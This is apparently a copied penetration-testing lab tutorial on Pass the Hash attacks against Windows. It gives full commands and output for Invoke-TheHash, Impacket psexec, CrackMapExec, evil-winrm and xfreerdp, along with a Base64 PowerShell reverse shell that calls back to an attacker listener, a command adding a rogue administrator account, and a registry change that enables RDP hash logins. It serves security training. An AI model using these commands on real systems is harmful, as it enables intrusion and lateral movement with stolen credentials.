<p>Another tool we can use to perform Pass the Hash attacks on Windows is <a href="https://github.com/Kevin-Robertson/Invoke-TheHash">Invoke-TheHash</a>. This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer. For this example we will use the user <code class="language-plaintext highlighter-rouge">julio</code> and the hash <code class="language-plaintext highlighter-rouge">64F12CDDAA88057E06A81B54E73B949B</code>.</p>

<p>When using <code class="language-plaintext highlighter-rouge">Invoke-TheHash</code>, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Target</code> - Hostname or IP address of the target.</li>
  <li><code class="language-plaintext highlighter-rouge">Username</code> - Username to use for authentication.</li>
  <li><code class="language-plaintext highlighter-rouge">Domain</code> - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.</li>
  <li><code class="language-plaintext highlighter-rouge">Hash</code> - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.</li>
  <li><code class="language-plaintext highlighter-rouge">Command</code> - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.</li>
</ul>

<p>The following command will use the SMB method for command execution to create a new user named mark and add the user to the Administrators group.</p>

<h4 id="invoke-thehash-with-smb">Invoke-TheHash with SMB</h4>

<p>Pass the Hash (PtH)</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">c:\htb</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="nx">C:\tools\Invoke-TheHash\</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">c:\tools\Invoke-TheHash</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\Invoke-TheHash.psd1</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">c:\tools\Invoke-TheHash</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-SMBExec</span><span class="w"> </span><span class="nt">-Target</span><span class="w"> </span><span class="nx">172.16.1.10</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">inlanefreight.htb</span><span class="w"> </span><span class="nt">-Username</span><span class="w"> </span><span class="nx">julio</span><span class="w"> </span><span class="nt">-Hash</span><span class="w"> </span><span class="nx">64F12CDDAA88057E06A81B54E73B949B</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add"</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">

</span><span class="n">VERBOSE:</span><span class="w"> </span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nx">inlanefreight.htb\julio</span><span class="w"> </span><span class="nx">successfully</span><span class="w"> </span><span class="nx">authenticated</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">172.16.1.10</span><span class="w">
</span><span class="n">VERBOSE:</span><span class="w"> </span><span class="nx">inlanefreight.htb\julio</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">Service</span><span class="w"> </span><span class="nx">Control</span><span class="w"> </span><span class="nx">Manager</span><span class="w"> </span><span class="nx">write</span><span class="w"> </span><span class="nx">privilege</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">172.16.1.10</span><span class="w">
</span><span class="n">VERBOSE:</span><span class="w"> </span><span class="nx">Service</span><span class="w"> </span><span class="nx">EGDKNNLQVOLFHRQTQMAU</span><span class="w"> </span><span class="nx">created</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">172.16.1.10</span><span class="w">
</span><span class="n">VERBOSE:</span><span class="w"> </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Trying</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">execute</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">172.16.1.10</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="kr">Command</span><span class="w"> </span><span class="n">executed</span><span class="w"> </span><span class="nx">wi---th</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">EGDKNNLQVOLFHRQTQMAU</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">172.16.1.10</span><span class="w">
</span><span class="n">VERBOSE:</span><span class="w"> </span><span class="nx">Service</span><span class="w"> </span><span class="nx">EGDKNNLQVOLFHRQTQMAU</span><span class="w"> </span><span class="nx">deleted</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">172.16.1.10</span><span class="w">
</span></code></pre></div></div>

<p>We can also get a reverse shell connection in the target machine. If you are unfamiliar with reverse shells, review the <a href="https://academy.hackthebox.com/module/details/115">Shells &amp; Payloads</a> module on HTB Academy.</p>

<p>To get a reverse shell, we need to start our listener using Netcat on our Windows machine, which has the IP address 172.16.1.5. We will use port 8001 to wait for the connection.</p>

<h4 id="netcat-listener">Netcat Listener</h4>

<p>Pass the Hash (PtH)</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\tools</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\nc.exe</span><span class="w"> </span><span class="nt">-lvnp</span><span class="w"> </span><span class="nx">8001</span><span class="w">
</span><span class="n">listening</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="p">[</span><span class="n">any</span><span class="p">]</span><span class="w"> </span><span class="nx">8001</span><span class="w"> </span><span class="o">...</span><span class="w">
</span></code></pre></div></div>

<p>To create a simple reverse shell using PowerShell, we can visit <a href="https://www.revshells.com/">https://www.revshells.com/</a>, set our IP <code class="language-plaintext highlighter-rouge">172.16.1.5</code> and port <code class="language-plaintext highlighter-rouge">8001</code>, and select the option <code class="language-plaintext highlighter-rouge">PowerShell #3 (Base64)</code>, as shown in the following image.</p>

<p><img src="https://academy.hackthebox.com/storage/modules/147/rshellonline.jpg" alt="Reverse Shell Generator interface with IP 172.16.1.5, port 8001, and PowerShell Base64 payload." /></p>

<p>Now we can execute <code class="language-plaintext highlighter-rouge">Invoke-TheHash</code> to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is <code class="language-plaintext highlighter-rouge">172.16.1.10</code>, we will use the machine name <code class="language-plaintext highlighter-rouge">DC01</code> (either would work).</p>

<h4 id="invoke-thehash-with-wmi">Invoke-TheHash with WMI</h4>

<p>Pass the Hash (PtH)</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">c:\tools\Invoke-TheHash</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\Invoke-TheHash.psd1</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">c:\tools\Invoke-TheHash</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-WMIExec</span><span class="w"> </span><span class="nt">-Target</span><span class="w"> </span><span class="nx">DC01</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">inlanefreight.htb</span><span class="w"> </span><span class="nt">-Username</span><span class="w"> </span><span class="nx">julio</span><span class="w"> </span><span class="nt">-Hash</span><span class="w"> </span><span class="nx">64F12CDDAA88057E06A81B54E73B949B</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="</span><span class="w">

</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="kr">Command</span><span class="w"> </span><span class="n">executed</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="nx">id</span><span class="w"> </span><span class="nx">520</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">DC01</span><span class="w">
</span></code></pre></div></div>

<p>The result is a reverse shell connection from the DC01 host (172.16.1.10).</p>

<p><img src="https://academy.hackthebox.com/storage/modules/147/pth_invoke_the_hash.jpg" alt="PowerShell and command prompt showing Invoke-TheHash execution with network connection details and whoami command output." /></p>

<hr />

<h2 id="pass-the-hash-with-impacket-linux">Pass the Hash with Impacket (Linux)</h2>

<p><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> has several tools we can use for different operations such as <code class="language-plaintext highlighter-rouge">Command Execution</code> and <code class="language-plaintext highlighter-rouge">Credential Dumping</code>, <code class="language-plaintext highlighter-rouge">Enumeration</code>, etc. For this example, we will perform command execution on the target machine using <code class="language-plaintext highlighter-rouge">PsExec</code>.</p>

<h4 id="pass-the-hash-with-impacket-psexec">Pass the Hash with Impacket PsExec</h4>

<p>Pass the Hash (PtH)</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>impacket-psexec administrator@10.129.201.126 <span class="nt">-hashes</span> :30B3783CE2ABF1AF70F77D0660CF3453

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.129.201.126.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file SLUBMRXK.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.129.201.126.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service AdzX on 10.129.201.126.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service AdzX.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.19044.1415]
<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<p>There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:</p>

<ul>
  <li><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py">impacket-wmiexec</a></li>
  <li><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py">impacket-atexec</a></li>
  <li><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py">impacket-smbexec</a></li>
</ul>

<h2 id="pass-the-hash-with-crackmapexec-linux">Pass the Hash with CrackMapExec (Linux)</h2>

<p><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. We can use CrackMapExec to try to authenticate to some or all hosts in a network looking for one host where we can authenticate successfully as a local admin. This method is also called “Password Spraying” and is covered in-depth in the Active Directory Enumeration &amp; Attacks module. Note that this method can lock out domain accounts, so keep the target domain’s account lockout policy in mind and make sure to use the local account method, which will try just one login attempt on a host in a given range using the credentials provided if that is your intent.</p>

<h4 id="pass-the-hash-with-crackmapexec">Pass the Hash with CrackMapExec</h4>

<p>Pass the Hash (PtH)</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]# crackmapexec smb 172.16.1.0/24 <span class="nt">-u</span> Administrator <span class="nt">-d</span> <span class="nb">.</span> <span class="nt">-H</span> 30B3783CE2ABF1AF70F77D0660CF3453

SMB         172.16.1.10   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:.<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         172.16.1.10   445    DC01             <span class="o">[</span>-] .<span class="se">\A</span>dministrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
SMB         172.16.1.5    445    MS01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 19041 x64 <span class="o">(</span>name:MS01<span class="o">)</span> <span class="o">(</span>domain:.<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         172.16.1.5    445    MS01             <span class="o">[</span>+] .<span class="se">\A</span>dministrator 30B3783CE2ABF1AF70F77D0660CF3453 <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<p>If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add <code class="language-plaintext highlighter-rouge">--local-auth</code> to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see <code class="language-plaintext highlighter-rouge">Pwn3d!</code>, it means that the user is a local administrator on the target computer. We can use the option <code class="language-plaintext highlighter-rouge">-x</code> to execute commands. It is common to see password reuse against many hosts in the same subnet. Organizations will often use gold images with the same local admin password or set this password the same across multiple hosts for ease of administration. If we run into this issue on a real-world engagement, a great recommendation for the customer is to implement the <a href="https://www.microsoft.com/en-us/download/details.aspx?id=46899">Local Administrator Password Solution (LAPS)</a>, which randomizes the local administrator password and can be configured to have it rotate on a fixed interval.</p>

<h4 id="crackmapexec---command-execution">CrackMapExec - Command Execution</h4>

<p>Pass the Hash (PtH)</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]# crackmapexec smb 10.129.201.126 <span class="nt">-u</span> Administrator <span class="nt">-d</span> <span class="nb">.</span> <span class="nt">-H</span> 30B3783CE2ABF1AF70F77D0660CF3453 <span class="nt">-x</span> <span class="nb">whoami

</span>SMB         10.129.201.126  445    MS01            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 Enterprise 10240 x64 <span class="o">(</span>name:MS01<span class="o">)</span> <span class="o">(</span>domain:.<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         10.129.201.126  445    MS01            <span class="o">[</span>+] .<span class="se">\A</span>dministrator 30B3783CE2ABF1AF70F77D0660CF3453 <span class="o">(</span>Pwn3d!<span class="o">)</span>
SMB         10.129.201.126  445    MS01            <span class="o">[</span>+] Executed <span class="nb">command 
</span>SMB         10.129.201.126  445    MS01            MS01<span class="se">\a</span>dministrator
</code></pre></div></div>

<p>Review the <a href="https://web.archive.org/web/20220902185948/https://wiki.porchetta.industries/">CrackMapExec documentation Wiki</a> (<a href="https://www.netexec.wiki/">NetExec documentation wiki</a>) to learn more about the tool’s extensive features.</p>

<h2 id="pass-the-hash-with-evil-winrm-linux">Pass the Hash with evil-winrm (Linux)</h2>

<p><a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> is another tool we can use to authenticate using the Pass the Hash attack with PowerShell remoting. If SMB is blocked or we don’t have administrative rights, we can use this alternative protocol to connect to the target machine.</p>

<h4 id="pass-the-hash-with-evil-winrm">Pass the Hash with evil-winrm</h4>

<p>Pass the Hash (PtH)</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>evil-winrm <span class="nt">-i</span> 10.129.201.126 <span class="nt">-u</span> Administrator <span class="nt">-H</span> 30B3783CE2ABF1AF70F77D0660CF3453

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<p><strong>Note:</strong> When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb</p>

<h2 id="pass-the-hash-with-rdp-linux">Pass the Hash with RDP (Linux)</h2>

<p>We can perform an RDP PtH attack to gain GUI access to the target system using tools like <code class="language-plaintext highlighter-rouge">xfreerdp</code>.</p>

<p>There are a few caveats to this attack:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Restricted Admin Mode</code>, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:</li>
</ul>

<p><img src="https://academy.hackthebox.com/storage/modules/147/rdp_session-4.png" alt="Error message: Account restrictions prevent signing in due to blank passwords, limited sign-in times, or policy restrictions." /></p>

<p>This can be enabled by adding a new registry key <code class="language-plaintext highlighter-rouge">DisableRestrictedAdmin</code> (REG_DWORD) under <code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa</code> with the value of 0. It can be done using the following command:</p>

<h4 id="enable-restricted-admin-mode-to-allow-pth">Enable Restricted Admin Mode to Allow PtH</h4>

<p>Pass the Hash (PtH)</p>

<pre><code class="language-cmd">c:\tools&gt; reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
</code></pre>

<p><img src="https://academy.hackthebox.com/storage/modules/147/rdp_session-5.png" alt="Registry Editor showing path to Lsa with DisableRestrictedAdmin set to 0." /></p>

<p>Once the registry key is added, we can use <code class="language-plaintext highlighter-rouge">xfreerdp</code> with the option <code class="language-plaintext highlighter-rouge">/pth</code> to gain RDP access:</p>

<h4 id="pass-the-hash-using-rdp">Pass the Hash Using RDP</h4>

<p>Pass the Hash (PtH)</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

<span class="o">[</span>15:38:26:999] <span class="o">[</span>94965:94966] <span class="o">[</span>INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
<span class="o">[</span>15:38:26:999] <span class="o">[</span>94965:94966] <span class="o">[</span>INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
...snip...
<span class="o">[</span>15:38:26:352] <span class="o">[</span>94965:94966] <span class="o">[</span>ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
<span class="o">[</span>15:38:26:352] <span class="o">[</span>94965:94966] <span class="o">[</span>ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
<span class="o">[</span>15:38:26:352] <span class="o">[</span>94965:94966] <span class="o">[</span>ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
...SNIP...
</code></pre></div></div>

<p><img src="https://academy.hackthebox.com/storage/modules/147/rdp_session_new.jpg" alt="Windows desktop accessed via FreeRDP with Parrot Terminal showing command execution and desktop icons for Recycle Bin, Invoke-TheHash, and mimikatz." /></p>

<h2 id="uac-limits-pass-the-hash-for-local-accounts">UAC Limits Pass the Hash for Local Accounts</h2>

<p>UAC (User Account Control) limits local users’ ability to perform remote administration operations. When the registry key <code class="language-plaintext highlighter-rouge">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy</code> is set to 0, it means that the built-in local admin account (RID-500, “Administrator”) is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.</p>

<p><strong>Note:</strong> There is one exception, if the registry key <code class="language-plaintext highlighter-rouge">FilterAdministratorToken</code> (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.</p>

<p>These settings are only for local administrative accounts. If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer. If you want to learn more about LocalAccountTokenFilterPolicy, you can read Will Schroeder’s blog post <a href="https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167">Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy</a>.</p>

</article>
      </section>
    </div>
  </div>

   <footer>
  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
    <span>
        <b>c0derpwner</b>
    </span>
    
    <span>© 2025</span>
  </a>
</footer>

  
</body>

</html>